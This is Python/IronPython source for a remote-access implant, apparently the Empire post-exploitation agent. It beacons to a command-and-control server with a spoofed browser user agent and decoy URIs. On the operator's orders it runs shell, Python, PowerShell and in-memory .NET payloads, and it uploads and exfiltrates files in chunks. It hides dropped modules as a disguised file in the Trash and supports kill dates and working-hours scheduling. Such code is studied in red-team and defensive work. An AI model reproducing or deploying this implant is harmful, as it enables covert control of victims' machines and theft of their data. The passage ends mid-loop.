import base64
import datetime
import http.server
import io
import json
import math
import numbers
import os
import random
import re
import shutil
import socket
import stat
import struct
import subprocess
import sys
import threading
import time
import types
import zipfile
import zlib
from io import StringIO
from os.path import expanduser
from threading import Thread

import clr
import System
from System import Environment

clr.AddReference("System.Management.Automation")
from System.Management.Automation import Runspaces

################################################
#
# agent configuration information
#
################################################

# print "starting agent"

# profile format ->
#   tasking uris | user agent | additional header 1 | additional header 2 | ...
profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

if server.endswith("/"): server = server[0:-1]

delay = 60
jitter = 0.0
lostLimit = 60
missedCheckins = 0
jobMessageBuffer = ''
currentListenerName = ""
sendMsgFuncCode = ""
proxy_list = []

# killDate form -> "MO/DAY/YEAR"
killDate = 'REPLACE_KILLDATE'
# workingHours form -> "9:00-17:00"
workingHours = 'REPLACE_WORKINGHOURS'

parts = profile.split('|')
taskURIs = parts[0].split(',')
userAgent = parts[1]
headersRaw = parts[2:]

defaultResponse = base64.b64decode("")

jobs = []
moduleRepo = {}
_meta_cache = {}

# global header dictionary
#   sessionID is set by stager.py
# headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}
headers = {'User-Agent': userAgent}

# parse the headers into the global header dictionary
for headerRaw in headersRaw:
    try:
        headerKey = headerRaw.split(":")[0]
        headerValue = headerRaw.split(":")[1]

        if headerKey.lower() == "cookie":
            headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
        else:
            headers[headerKey] = headerValue
    except:
        pass

################################################
#
# encryption methods
#
################################################

def decode_routing_packet(data):
    """
    Parse ALL routing packets and only process the ones applicable
    to this agent.
    """
    # returns {sessionID : (language, meta, additional, [encData]), ...}
    packets = parse_routing_packet(stagingKey, data)
    if packets is None:
        return
    for agentID, packet in packets.items():
        if agentID == sessionID:
            (language, meta, additional, encData) = packet
            # if meta == 'SERVER_RESPONSE':
            process_tasking(encData)
        else:
            # TODO: how to handle forwarding on other agent routing packets?
            pass


def build_response_packet(taskingID, packetData, resultID=0):
    """
    Build a task packet for an agent.

        [2 bytes] - type
        [2 bytes] - total # of packets
        [2 bytes] - packet #
        [2 bytes] - task/result ID
        [4 bytes] - length
        [X...]    - result data

        +------+--------------------+----------+---------+--------+-----------+
        | Type | total # of packets | packet # | task ID | Length | task data |
        +------+--------------------+--------------------+--------+-----------+
        |  2   |         2          |    2     |    2    |   4    | <Length>  |
        +------+--------------------+----------+---------+--------+-----------+
    """
    packetType = struct.pack('=H', taskingID)
    totalPacket = struct.pack('=H', 1)
    packetNum = struct.pack('=H', 1)
    resultID = struct.pack('=H', resultID)

    if packetData:
        if (isinstance(packetData, str)):
            packetData = base64.b64encode(packetData.encode('utf-8', 'ignore'))
        else:
            packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8', 'ignore'))
        if len(packetData) % 4:
            packetData += '=' * (4 - len(packetData) % 4)

        length = struct.pack('=L', len(packetData))
        return packetType + totalPacket + packetNum + resultID + length + packetData
    else:
        length = struct.pack('=L', 0)
        return packetType + totalPacket + packetNum + resultID + length


def parse_task_packet(packet, offset=0):
    """
    Parse a result packet-

        [2 bytes] - type
        [2 bytes] - total # of packets
        [2 bytes] - packet #
        [2 bytes] - task/result ID
        [4 bytes] - length
        [X...]    - result data

        +------+--------------------+----------+---------+--------+-----------+
        | Type | total # of packets | packet # | task ID | Length | task data |
        +------+--------------------+--------------------+--------+-----------+
        |  2   |         2          |    2     |    2    |   4    | <Length>  |
        +------+--------------------+----------+---------+--------+-----------+

    Returns a tuple with (responseName, length, data, remainingData)

    Returns a tuple with (responseName, totalPackets, packetNum, resultID, length, data, remainingData)
    """
    try:
        packetType = struct.unpack('=H', packet[0 + offset:2 + offset])[0]
        totalPacket = struct.unpack('=H', packet[2 + offset:4 + offset])[0]
        packetNum = struct.unpack('=H', packet[4 + offset:6 + offset])[0]
        resultID = struct.unpack('=H', packet[6 + offset:8 + offset])[0]
        length = struct.unpack('=L', packet[8 + offset:12 + offset])[0]
        packetData = packet[12 + offset:12 + offset + length].decode('UTF-8')
        remainingData = packet[12 + offset + length:].decode('UTF-8')

        return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
    except Exception as e:
        print("parse_task_packet exception:", e)
        return (None, None, None, None, None, None, None)


def process_tasking(data):
    # processes an encrypted data packet
    #   -decrypts/verifies the response to get
    #   -extracts the packets and processes each
    try:
        # aes_decrypt_and_verify is in stager.py
        tasking = aes_decrypt_and_verify(key, data).encode('UTF-8')
        (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)

        # if we get to this point, we have a legit tasking so reset missedCheckins
        missedCheckins = 0

        # execute/process the packets and get any response
        resultPackets = ""
        result = process_packet(packetType, data, resultID)

        if result:
            resultPackets += result

        packetOffset = 12 + length
        while remainingData and remainingData != '':
            (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking,
                                                                                                            offset=packetOffset)
            result = process_packet(packetType, data, resultID)
            if result:
                resultPackets += result

            packetOffset += 12 + length

        # send_message() is patched in from the listener module
        send_message(resultPackets)

    except Exception as e:
        print(e)
        # print "processTasking exception:",e
        pass


def process_job_tasking(result):
    # process job data packets
    #  - returns to the C2
    # execute/process the packets and get any response
    try:
        resultPackets = b""
        if result:
            resultPackets += result
        # send packets
        send_message(resultPackets)
    except Exception as e:
        print("processJobTasking exception:", e)
        pass


def process_packet(packetType, data, resultID):
    try:
        packetType = int(packetType)
    except Exception as e:
        return None
    if packetType == 1:
        # sysinfo request
        # get_sysinfo should be exposed from stager.py
        send_message(build_response_packet(1, get_sysinfo(), resultID))

    elif packetType == 2:
        # agent exit
        send_message(build_response_packet(2, "", resultID))
        agent_exit()

    elif packetType == 34:
        proxy_list = json.loads(data)
        update_proxychain(proxy_list)

    elif packetType == 40:
        # run a command
        parts = data.split(" ")
        if len(parts) == 1:
            data = parts[0]
            resultData = str(run_command(data))
            send_message(build_response_packet(40, resultData, resultID))
        else:
            cmd = parts[0]
            cmdargs = ' '.join(parts[1:len(parts)])
            resultData = str(run_command(cmd, cmdargs=cmdargs))
            send_message(build_response_packet(40, resultData, resultID))

    elif packetType == 41:
        # file download
        objPath = os.path.abspath(data)
        fileList = []
        if not os.path.exists(objPath):
            send_message(build_response_packet(40, "file does not exist or cannot be accessed", resultID))

        if not os.path.isdir(objPath):
            fileList.append(objPath)
        else:
            # recursive dir listing
            for folder, subs, files in os.walk(objPath):
                for filename in files:
                    # dont care about symlinks
                    if os.path.exists(objPath):
                        fileList.append(objPath + "/" + filename)

        for filePath in fileList:
            offset = 0
            size = os.path.getsize(filePath)
            partIndex = 0

            while True:

                # get 512kb of the given file starting at the specified offset
                encodedPart = get_file_part(filePath, offset=offset, base64=False)
                c = compress()
                start_crc32 = c.crc32_data(encodedPart)
                comp_data = c.comp_data(encodedPart)
                encodedPart = c.build_header(comp_data, start_crc32)
                encodedPart = base64.b64encode(encodedPart).decode('UTF-8')

                partData = "%s|%s|%s|%s" % (partIndex, filePath, size, encodedPart)
                if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
                    break

                send_message(build_response_packet(41, partData, resultID))

                global delay
                global jitter
                if jitter < 0: jitter = -jitter
                if jitter > 1: jitter = old_div(1, jitter)

                minSleep = int((1.0 - jitter) * delay)
                maxSleep = int((1.0 + jitter) * delay)
                sleepTime = random.randint(minSleep, maxSleep)
                time.sleep(sleepTime)
                partIndex += 1
                offset += 512000

    elif packetType == 42:
        # file upload
        try:
            parts = data.split("|")
            filePath = parts[0]
            base64part = parts[1]
            raw = base64.b64decode(base64part)
            with open(filePath, 'ab') as f:
                f.write(raw)
            send_message(build_response_packet(42, "[*] Upload of %s successful" % (filePath), resultID))
        except Exception as e:
            send_message(build_response_packet(0, "[!] Error in writing file %s during upload: %s" % (filePath, str(e)), resultID))

    elif packetType == 43:
        # directory list
        cmdargs = data

        path = '/'  # default to root
        if cmdargs is not None and cmdargs != '' and cmdargs != '/':  # strip trailing slash for uniformity
            path = cmdargs.rstrip('/')
        if path[0] != '/':  # always scan relative to root for uniformity
            path = '/{0}'.format(path)
        if not os.path.isdir(path):
            send_message(build_response_packet(43, 'Directory {} not found.'.format(path), resultID))
        items = []
        with os.scandir(path) as it:
            for entry in it:
                items.append({'path': entry.path, 'name': entry.name, 'is_file': entry.is_file()})

        result_data = json.dumps({
            'directory_name': path if len(path) == 1 else path.split('/')[-1],
            'directory_path': path,
            'items': items
        })

        send_message(build_response_packet(43, result_data, resultID))

    elif packetType == 50:
        # return the currently running jobs
        msg = ""
        if len(jobs) == 0:
            msg = "No active jobs"
        else:
            msg = "Active jobs:\n"
            for x in range(len(jobs)):
                msg += "\t%s" % (x)
        send_message(build_response_packet(50, msg, resultID))

    elif packetType == 51:
        # stop and remove a specified job if it's running
        try:
            # Calling join first seems to hang
            # result = jobs[int(data)].join()
            send_message(build_response_packet(0, "[*] Attempting to stop job thread", resultID))
            result = jobs[int(data)].kill()
            send_message(build_response_packet(0, "[*] Job thread stoped!", resultID))
            jobs[int(data)]._Thread__stop()
            jobs.pop(int(data))
            if result and result != "":
                send_message(build_response_packet(51, result, resultID))
        except:
            return build_response_packet(0, "error stopping job: %s" % (data), resultID)

    elif packetType == 100:
        # dynamic code execution, wait for output, don't save outputPicl
        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, '<string>', 'exec')
            exec(code_obj, globals())
            sys.stdout = sys.__stdout__
            results = buffer.getvalue()
            send_message(build_response_packet(100, str(results), resultID))
        except Exception as e:
            errorData = str(buffer.getvalue())
            return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" % (
            e, errorData), resultID)

    elif packetType == 101:
        # dynamic code execution, wait for output, save output
        prefix = data[0:15].strip()
        extension = data[15:20].strip()
        data = data[20:]
        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, '<string>', 'exec')
            exec(code_obj, globals())
            sys.stdout = sys.__stdout__
            results = buffer.getvalue().encode('latin-1')
            c = compress()
            start_crc32 = c.crc32_data(results)
            comp_data = c.comp_data(results)
            encodedPart = c.build_header(comp_data, start_crc32)
            encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
            send_message(
                build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart,
                                      resultID))
        except Exception as e:
            # Also return partial code that has been executed
            errorData = buffer.getvalue()
            send_message(build_response_packet(0,
                                               "error executing specified Python data %s \nBuffer data recovered:\n%s" % (
                                               e, errorData), resultID))

    elif packetType == 102:
        # on disk code execution for modules that require multiprocessing not supported by exec
        try:
            implantHome = expanduser("~") + '/.Trash/'
            moduleName = ".mac-debug-data"
            implantPath = implantHome + moduleName
            result = "[*] Module disk path: %s \n" % (implantPath)
            with open(implantPath, 'w') as f:
                f.write(data)
            result += "[*] Module properly dropped to disk \n"
            pythonCommand = "python %s" % (implantPath)
            process = subprocess.Popen(pythonCommand, stdout=subprocess.PIPE, shell=True)
            data = process.communicate()
            result += data[0].strip()
            try:
                os.remove(implantPath)
                result += "[*] Module path was properly removed: %s" % (implantPath)
            except Exception as e:
                print("error removing module filed: %s" % (e))
            fileCheck = os.path.isfile(implantPath)
            if fileCheck:
                result += "\n\nError removing module file, please verify path: " + str(implantPath)
            send_message(build_response_packet(100, str(result), resultID))
        except Exception as e:
            fileCheck = os.path.isfile(implantPath)
            if fileCheck:
                send_message(build_response_packet(0,
                                                   "error executing specified Python data: %s \nError removing module file, please verify path: %s" % (
                                                   e, implantPath), resultID))
            send_message(build_response_packet(0, "error executing specified Python data: %s" % (e), resultID))

    elif packetType == 110:
        start_job(data, resultID)

    elif packetType == 111:
        # TASK_CMD_JOB_SAVE
        pass

    elif packetType == 112:
        data = data.lstrip("\x00")

        # powershell task
        myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
        myrunspace.Open()
        pipeline = myrunspace.CreatePipeline()
        pipeline.Commands.AddScript(data)
        results = pipeline.Invoke()
        buffer = StringIO()
        sys.stdout = buffer
        for result in results:
            print(result)
        sys.stdout = sys.__stdout__
        result_packet = build_response_packet(110, str(buffer.getvalue()), resultID)
        process_job_tasking(result_packet)

    elif packetType == 118:
        # dynamic code execution, wait for output, don't save output
        try:
            data = data.lstrip("\x00")

            # powershell task
            myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
            myrunspace.Open()
            pipeline = myrunspace.CreatePipeline()
            pipeline.Commands.AddScript(data)
            pipeline.Commands.Add('Out-String')
            results = pipeline.Invoke()

            for result in results:
                print(result)

            result_packet = build_response_packet(110, str(result), resultID)
            process_job_tasking(result_packet)

        except Exception as e:
            print(e)
            send_message(build_response_packet(0, "error executing specified Python data %s " % (e), resultID))

    elif packetType == 119:
        pass

    elif packetType == 44:
        # run csharp module in ironpython using reflection
        try:
            import zlib

            import System.IO
            from System import Array, Byte, Char, Console, Object, String, Text
            from System.IO import Compression, MemoryStream, StreamWriter
            from System.Reflection import Assembly
            from System.Text import Encoding

            parts = data.split(',')
            params = parts[1:len(parts)]
            data_bytes = base64.b64decode(parts[0])

            params = ' '.join(params)
            decoded_data = zlib.decompress(data_bytes, -15)
            assemBytes = Array[Byte](decoded_data)
            assembly = Assembly.Load(assemBytes)

            strmprop = assembly.GetType("Task").GetProperty("OutputStream")
            if not strmprop:
                print("no output pipe")
                results = assembly.GetType('Task').GetMethod('Execute').Invoke(None, params)
                result_packet = build_response_packet(110, str(results), resultID)
                process_job_tasking(result_packet)

            else:
                def csharp_job_func(decoded_data, params, pipeClientStream):
                    assemBytes = Array[Byte](decoded_data)
                    assembly = Assembly.Load(assemBytes)

                    strmprop = assembly.GetType("Task").GetProperty("OutputStream")
                    strmprop.SetValue(None, pipeClientStream, None)
                    assembly.GetType("Task").GetMethod("Execute").Invoke(None, Array[Object]({params}))
                    pipeClientStream.Dispose()

                print('output pipe')
                clr.AddReference('System.Core')
                import System.IO.HandleInheritability
                import System.IO.Pipes

                pipeServerStream = System.IO.Pipes.AnonymousPipeServerStream(System.IO.Pipes.PipeDirection.In, System.IO.HandleInheritability.Inheritable)
                pipeClientStream = System.IO.Pipes.AnonymousPipeClientStream(System.IO.Pipes.PipeDirection.Out, pipeServerStream.GetClientHandleAsString())
                streamReader = System.IO.StreamReader(pipeServerStream)

                task_thread = KThread(target=csharp_job_func, args=(decoded_data, params, pipeClientStream,))

                pipeOutput = Text.StringBuilder()
                read = Array[Char](pipeServerStream.InBufferSize)

                task_thread.start()
                count = 1
                while count > 0:
                    time.sleep(1)
                    count = streamReader.Read(read, 0, read.Length)
                    stream_text = read[0:count]
                    pipeOutput.Append(stream_text)

                result_packet = build_response_packet(110, str(pipeOutput), resultID)
                process_job_tasking(result_packet)

        except Exception as e:
            send_message(build_response_packet(0, "error executing specified Python data %s " % (e), resultID))

    elif packetType == 121:
        # base64 decode the script and execute
        script = base64.b64decode(data)
        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(script, '<string>', 'exec')
            exec(code_obj, globals())
            sys.stdout = sys.__stdout__
            result = str(buffer.getvalue())
            send_message(build_response_packet(121, result, resultID))
        except Exception as e:
            errorData = str(buffer.getvalue())
            send_message(build_response_packet(0,
                                               "error executing specified Python data %s \nBuffer data recovered:\n%s" % (
                                               e, errorData), resultID))

    elif packetType == 122:
        # base64 decode and decompress the data
        try:
            parts = data.split('|')
            base64part = parts[1]
            fileName = parts[0]
            raw = base64.b64decode(base64part)
            d = decompress()
            dec_data = d.dec_data(raw, cheader=True)
            if not dec_data['crc32_check']:
                send_message(build_response_packet(122, "Failed crc32_check during decompression", resultID))
        except Exception as e:
            send_message(build_response_packet(122, "Unable to decompress zip file: %s" % (e), resultID))

        zdata = dec_data['data']
        zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
        if fileName in list(moduleRepo.keys()):
            send_message(build_response_packet(122, "%s module already exists" % (fileName), resultID))
        else:
            moduleRepo[fileName] = zf
            install_hook(fileName)
            send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))

    elif packetType == 123:
        # view loaded modules
        repoName = data
        if repoName == "":
            loadedModules = "\nAll Repos\n"
            for key, value in list(moduleRepo.items()):
                loadedModules += "\n----" + key + "----\n"
                loadedModules += '\n'.join(moduleRepo[key].namelist())

            send_message(build_response_packet(123, loadedModules, resultID))
        else:
            try:
                loadedModules = "\n----" + repoName + "----\n"
                loadedModules += '\n'.join(moduleRepo[repoName].namelist())
                send_message(build_response_packet(123, loadedModules, resultID))
            except Exception as e:
                msg = "Unable to retrieve repo contents: %s" % (str(e))
                send_message(build_response_packet(123, msg, resultID))

    elif packetType == 124:
        # remove module
        repoName = data
        try:
            remove_hook(repoName)
            del moduleRepo[repoName]
            send_message(build_response_packet(124, "Successfully remove repo: %s" % (repoName), resultID))
        except Exception as e:
            send_message(build_response_packet(124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID))

    else:
        send_message(build_response_packet(0, "invalid tasking ID: %s" % (taskingID), resultID))


def old_div(a, b):
    """
    Equivalent to ``a / b`` on Python 2 without ``from __future__ import
    division``.
    """
    if isinstance(a, numbers.Integral) and isinstance(b, numbers.Integral):
        return a // b
    else:
        return a / b


################################################
#
# Custom Import Hook
# #adapted from https://github.com/sulinx/remote_importer
#
################################################

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [('.py', False), ('/__init__.py', True)]


class ZipImportError(ImportError):
    """Exception raised by zipimporter objects."""


# _get_info() = takes the fullname, then subpackage name (if applicable),
# and searches for the respective module or package

class CFinder(object):
    """Import Hook for Empire"""

    def __init__(self, repoName):
        self.repoName = repoName

    def _get_info(self, repoName, fullname):
        """Search for the respective package or module in the zipfile object"""
        parts = fullname.split('.')
        submodule = parts[-1]
        modulepath = '/'.join(parts)

        # check to see if that specific module exists
        for suffix, is_package in _search_order:
            relpath = modulepath + suffix
            try:
                moduleRepo[repoName].getinfo(relpath)
            except KeyError:
                pass
            else:
                return submodule, is_package, relpath

        # Error out if we can find the module/package
        msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
        raise ZipImportError(msg)

    def _get_source(self, repoName, fullname):
        """Get the source code for the requested module"""
        submodule, is_package, relpath = self._get_info(repoName, fullname)
        fullpath = '%s/%s' % (repoName, relpath)
        source = moduleRepo[repoName].read(relpath)
        source = source.replace('\r\n', '\n')
        source = source.replace('\r', '\n')
        return submodule, is_package, fullpath, source

    def find_module(self, fullname, path=None):

        try:
            submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        except ImportError:
            return None
        else:
            return self

    def load_module(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        code = compile(source, fullpath, 'exec')
        mod = sys.modules.setdefault(fullname, types.ModuleType(fullname))
        mod.__loader__ = self
        mod.__file__ = fullpath
        mod.__name__ = fullname
        if is_package:
            mod.__path__ = [os.path.dirname(mod.__file__)]
        exec(code, mod.__dict__)
        return mod

    def get_data(self, fullpath):

        prefix = os.path.join(self.repoName, '')
        if not fullpath.startswith(prefix):
            raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
        relpath = fullpath[len(prefix):]
        try:
            return moduleRepo[self.repoName].read(relpath)
        except KeyError:
            raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

    def is_package(self, fullname):
        """Return if the module is a package"""
        submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        return is_package

    def get_code(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        return compile(source, fullpath, 'exec')

    def install_hook(repoName):
        if repoName not in _meta_cache:
            finder = CFinder(repoName)
            _meta_cache[repoName] = finder
            sys.meta_path.append(finder)

    def remove_hook(repoName):
        if repoName in _meta_cache:
            finder = _meta_cache.pop(repoName)
            sys.meta_path.remove(finder)


################################################
#
# misc methods
#
################################################
class compress(object):
    '''
    Base clase for init of the package. This will handle
    the initial object creation for conducting basic functions.
    '''

    CRC_HSIZE = 4
    COMP_RATIO = 9

    def __init__(self, verbose=False):
        """
        Populates init.
        """
        pass

    def comp_data(self, data, cvalue=COMP_RATIO):
        '''
        Takes in a string and computes
        the comp obj.
        data = string wanting compression
        cvalue = 0-9 comp value (default 6)
        '''
        cdata = zlib.compress(data, cvalue)
        return cdata

    def crc32_data(self, data):
        '''
        Takes in a string and computes crc32 value.
        data = string before compression
        returns:
        HEX bytes of data
        '''
        crc = zlib.crc32(data) & 0xFFFFFFFF
        return crc

    def build_header(self, data, crc):
        '''
        Takes comp data, org crc32 value,
        and adds self header.
        data =  comp data
        crc = crc32 value
        '''
        header = struct.pack("!I", crc)
        built_data = header + data
        return built_data


class decompress(object):
    '''
    Base clase for init of the package. This will handle
    the initial object creation for conducting basic functions.
    '''

    CRC_HSIZE = 4
    COMP_RATIO = 9

    def __init__(self, verbose=False):
        """
        Populates init.
        """
        pass

    def dec_data(self, data, cheader=True):
        '''
        Takes:
        Custom / standard header data
        data = comp data with zlib header
        BOOL cheader = passing custom crc32 header
        returns:
        dict with crc32 cheack and dec data string
        ex. {"crc32" : true, "dec_data" : "-SNIP-"}
        '''
        if cheader:
            comp_crc32 = struct.unpack("!I", data[:self.CRC_HSIZE])[0]
            dec_data = zlib.decompress(data[self.CRC_HSIZE:])
            dec_crc32 = zlib.crc32(dec_data) & 0xFFFFFFFF
            if comp_crc32 == dec_crc32:
                crc32 = True
            else:
                crc32 = False
            return {"header_crc32": comp_crc32, "dec_crc32": dec_crc32, "crc32_check": crc32, "data": dec_data}
        else:
            dec_data = zlib.decompress(data)
            return dec_data


def agent_exit():
    # exit for proper job / thread cleanup
    if len(jobs) > 0:
        try:
            for x in jobs:
                jobs[int(x)].kill()
                jobs.pop(x)
        except:
            # die hard if thread kill fails
            pass
    sys.exit()


def indent(lines, amount=4, ch=' '):
    padding = amount * ch
    return padding + ('\n' + padding).join(lines.split('\n'))


# from http://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
class ThreadWithReturnValue(Thread):
    def __init__(self, group=None, target=None, name=None,
                 args=(), kwargs={}, Verbose=None):
        Thread.__init__(self, group, target, name, args, kwargs, Verbose)
        self._return = None

    def run(self):
        if self._Thread__target is not None:
            self._return = self._Thread__target(*self._Thread__args,
                                                **self._Thread__kwargs)

    def join(self):
        Thread.join(self)
        return self._return


class KThread(threading.Thread):
    """A subclass of threading.Thread, with a kill()
  method."""

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run  # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
    trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True


def start_job(code, resultID):
    global jobs

    # create a new code block with a defined method name
    codeBlock = "def method():\n" + indent(code[1:])

    # register the code block
    code_obj = compile(codeBlock, '<string>', 'exec')
    # code needs to be in the global listing
    # not the locals() scope
    exec(code_obj, globals())

    # create/process Packet start/return the thread
    # call the job_func so sys data can be captured
    codeThread = KThread(target=job_func, args=(resultID,))
    codeThread.start()

    jobs.append(codeThread)


def job_func(resultID):
    try:
        buffer = StringIO()
        sys.stdout = buffer
        # now call the function required
        # and capture the output via sys
        method()
        sys.stdout = sys.__stdout__
        dataStats_2 = buffer.getvalue()
        result = build_response_packet(110, str(dataStats_2), resultID)
        process_job_tasking(result)
    except Exception as e:
        p = "error executing specified Python job data: " + str(e)
        result = build_response_packet(0, p, resultID)
        process_job_tasking(result)

def job_message_buffer(message):
    # Supports job messages for checkin
    global jobMessageBuffer
    try:

        jobMessageBuffer += str(message)
    except Exception as e:
        print(e)


def get_job_message_buffer():
    global jobMessageBuffer
    try:
        result = build_response_packet(110, str(jobMessageBuffer))
        jobMessageBuffer = ""
        return result
    except Exception as e:
        return build_response_packet(0, "[!] Error getting job output: %s" % (e))


def send_job_message_buffer():
    if len(jobs) > 0:
        result = get_job_message_buffer()
        process_job_tasking(result)
    else:
        pass


def start_webserver(data, ip, port, serveCount):
    # thread data_webserver for execution
    t = threading.Thread(target=data_webserver, args=(data, ip, port, serveCount))
    t.start()
    return


def data_webserver(data, ip, port, serveCount):
    # hosts a file on port and IP servers data string
    hostName = str(ip)
    portNumber = int(port)
    data = str(data)
    serveCount = int(serveCount)
    count = 0

    class serverHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(s):
            """Respond to a GET request."""
            s.send_response(200)
            s.send_header("Content-type", "text/html")
            s.end_headers()
            s.wfile.write(data)

        def log_message(s, format, *args):
            return

    server_class = http.server.HTTPServer
    httpServer = server_class((hostName, portNumber), serverHandler)
    try:
        while (count < serveCount):
            httpServer.handle_request()
            count += 1
    except:
        pass
    httpServer.server_close()
    return


def permissions_to_unix_name(st_mode):
    permstr = ''
    usertypes = ['USR', 'GRP', 'OTH']
    for usertype in usertypes:
        perm_types = ['R', 'W', 'X']
        for permtype in perm_types:
            perm = getattr(stat, 'S_I%s%s' % (permtype, usertype))
            if st_mode & perm:
                permstr += permtype.lower()
            else:
                permstr += '-'
    return permstr


def directory_listing(path):
    # directory listings in python
    # https://www.opentechguides.com/how-to/article/python/78/directory-file-list.html

    res = ""
    for fn in os.listdir(path):
        fstat = os.stat(os.path.join(path, fn))
        permstr = permissions_to_unix_name(fstat[0])

        if os.path.isdir(fn):
            permstr = "d{}".format(permstr)
        else:
            permstr = "-{}".format(permstr)

        user = Environment.UserName
        # Needed?
        group = "Users"

        # Convert file size to MB, KB or Bytes
        if (fstat.st_size > 1024 * 1024):
            fsize = math.ceil(old_div(fstat.st_size, (1024 * 1024)))
            unit = "MB"
        elif (fstat.st_size > 1024):
            fsize = math.ceil(old_div(fstat.st_size, 1024))
            unit = "KB"
        else:
            fsize = fstat.st_size
            unit = "B"

        mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))

        res += '{} {} {} {:18s} {:f} {:2s} {:15.15s}\n'.format(permstr, user, group, mtime, fsize, unit, fn)

    return res


# additional implementation methods
def run_command(command, cmdargs=None):
    if re.compile("(ls|dir)").match(command):
        if cmdargs == None or not os.path.exists(cmdargs):
            cmdargs = '.'

        return directory_listing(cmdargs)
    if re.compile("cd").match(command):
        os.chdir(cmdargs)
        return str(os.getcwd())
    elif re.compile("pwd").match(command):
        return str(os.getcwd())
    elif re.compile("rm").match(command):
        if cmdargs == None:
            return "please provide a file or directory"

        if os.path.exists(cmdargs):
            if os.path.isfile(cmdargs):
                os.remove(cmdargs)
                return "done."
            elif os.path.isdir(cmdargs):
                shutil.rmtree(cmdargs)
                return "done."
            else:
                return "unsupported file type"
        else:
            return "specified file/directory does not exist"
    elif re.compile("mkdir").match(command):
        if cmdargs == None:
            return "please provide a directory"

        os.mkdir(cmdargs)
        return "Created directory: {}".format(cmdargs)

    elif re.compile("(whoami|getuid)").match(command):
        return Environment.UserName

    elif re.compile("hostname").match(command):
        return str(socket.gethostname())

    elif re.compile("ps").match(command):
        myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
        myrunspace.Open()
        pipeline = myrunspace.CreatePipeline()
        pipeline.Commands.AddScript("""
                    $owners = @{}
                    Get-WmiObject win32_process | ForEach-Object {$o = $_.getowner(); if(-not $($o.User)) {$o='N/A'} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
                    $p = "*";
                    $output = Get-Process $p | ForEach-Object {
                        $arch = 'x64';
                        if ([System.IntPtr]::Size -eq 4) {
                            $arch = 'x86';
                        }
                        else{
                            foreach($module in $_.modules) {
                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
                                    $arch = 'x86';
                                    break;
                                }
                            }
                        }
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                        $out | Add-Member Noteproperty 'PID' $_.ID
                        $out | Add-Member Noteproperty 'Arch' $arch
                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
                        $mem = "{0:N2} MB" -f $($_.WS/1MB)
                        $out | Add-Member Noteproperty 'MemUsage' $mem
                        $out
                    } | Sort-Object -Property PID | ConvertTo-Json;
                    $output
        """)
        results = pipeline.Invoke()
        buffer = StringIO()
        sys.stdout = buffer
        for result in results:
            print(result)
        sys.stdout = sys.__stdout__
        return_data = buffer.getvalue()
        return return_data
    else:
        if cmdargs is None:
            cmdargs = ''
        cmd = "{} {}".format(command, cmdargs)
        return os.popen(cmd).read()


def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
    if not os.path.exists(filePath):
        return ''

    f = open(filePath, 'rb')
    f.seek(offset, 0)
    data = f.read(chunkSize)
    f.close()
    if base64:
        return base64.b64encode(data)
    else:
        return data


################################################
#
# main agent functionality
#
################################################

while (True):
    try:
        if workingHours != '' and 'WORKINGHOURS' not in workingHours:
            try:
                start, end = workingHours.split('-')
                now = datetime.datetime.now()
                startTime = datetime.datetime.strptime(start, "%H:%M")
                endTime = datetime.datetime.strptime(end, "%H:%M")

                if not (startTime <= now <= endTime):
                    sleepTime = startTime - now
                    # sleep until the start of the next window
                    time.sleep(sleepTime.seconds)

            except Exception as e:
                pass

        # check if we're past the killdate for this agent
        #   killDate form -> MO/DAY/YEAR
        if killDate != "" and 'KILLDATE' not in killDate:
            now = datetime.datetime.now().date()
            try:
                killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
            except:
                pass

            if now >= killDateTime:
                msg = "[!] Agent %s exiting" % (sessionID)
